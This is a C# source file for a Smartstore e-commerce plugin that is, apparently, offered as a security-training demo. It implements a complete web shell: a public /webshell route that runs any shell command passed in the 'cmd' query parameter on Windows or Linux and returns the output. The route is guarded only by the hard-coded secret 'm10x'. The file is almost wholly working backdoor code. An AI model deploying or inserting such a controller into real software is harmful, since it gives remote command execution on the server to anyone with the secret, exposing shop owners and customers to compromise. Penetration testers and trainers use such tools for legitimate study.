using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Smartstore.Web.Controllers;

namespace M10x.Webshell.Controllers;

/// <summary>
/// DEMO ONLY - command execution with shared secret for local security training.
/// Install -&gt; GET /webshell?secret=m10x&amp;cmd=id -&gt; delete plugin afterwards.
/// Analogous to https://github.com/m10x/Shopware-Extension-Webshell
/// </summary>
public class ShellController : PublicController
{
    private const string Secret = "m10x";

    [HttpGet]
    [Route("webshell")]
    public async Task<IActionResult> Shell([FromQuery] string secret, [FromQuery] string cmd = "id")
    {
        if (!string.Equals(secret, Secret, StringComparison.Ordinal))
        {
            return StatusCode(403, "Forbidden");
        }

        if (string.IsNullOrWhiteSpace(cmd))
        {
            cmd = "id";
        }

        var output = await ExecuteShellCommandAsync(cmd);

        return Content("<pre>" + WebUtility.HtmlEncode(output) + "</pre>", "text/html", Encoding.UTF8);
    }

    private static async Task<string> ExecuteShellCommandAsync(string cmd)
    {
        var fileName = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "cmd.exe" : "/bin/bash";
        // "2>&1" analogous to PHP shell_exec($cmd . ' 2>&1'): merge stderr into stdout.
        var arguments = RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
            ? $"/c {cmd} 2>&1"
            : $"-c \"{cmd.Replace("\"", "\\\"")} 2>&1\"";

        try
        {
            using var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = arguments,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                }
            };

            process.Start();
            var stdout = await process.StandardOutput.ReadToEndAsync();
            var stderr = await process.StandardError.ReadToEndAsync();
            await process.WaitForExitAsync();

            return string.IsNullOrEmpty(stderr) ? stdout : stdout + stderr;
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }
}
